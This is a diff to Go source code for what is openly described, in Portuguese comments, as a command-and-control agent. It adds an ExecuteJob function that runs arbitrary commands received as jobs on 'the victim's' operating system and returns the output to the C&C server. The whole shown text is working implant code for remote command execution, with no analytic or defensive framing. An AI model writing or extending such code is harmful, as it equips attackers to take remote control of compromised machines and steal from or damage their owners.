@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"errors"
 	"net/http"
+	"os/exec"
 	"time"
 )
 
@@ -98,4 +99,21 @@ func (a *AgentHTTP) RequestJob(agentID string) (Job, error) {
 	}
 
 	return job, nil
+}
+
+// ExecuteJob invoca o Sistema Operacional da vítima para rodar o comando e capturar a saída
+func (a *AgentHTTP) ExecuteJob(job Job) (string, error) {
+	// 1. Preparamos o comando para o Sistema Operacional usando os/exec
+	cmd := exec.Command(job.Command, job.Args...)
+
+	// 2. Executamos o comando e capturamos a saída padrão (stdout e stderr combinados)
+	output, err := cmd.CombinedOutput()
+	
+	if err != nil {
+		// Se o comando falhar (ex: comando não existe), devolvemos o erro junto com o que o terminal cuspiu
+		return string(output) + "\n" + err.Error(), err
+	}
+
+	// 3. Devolvemos a string limpa do terminal para ser enviada de volta ao C&C
+	return string(output), nil
 }
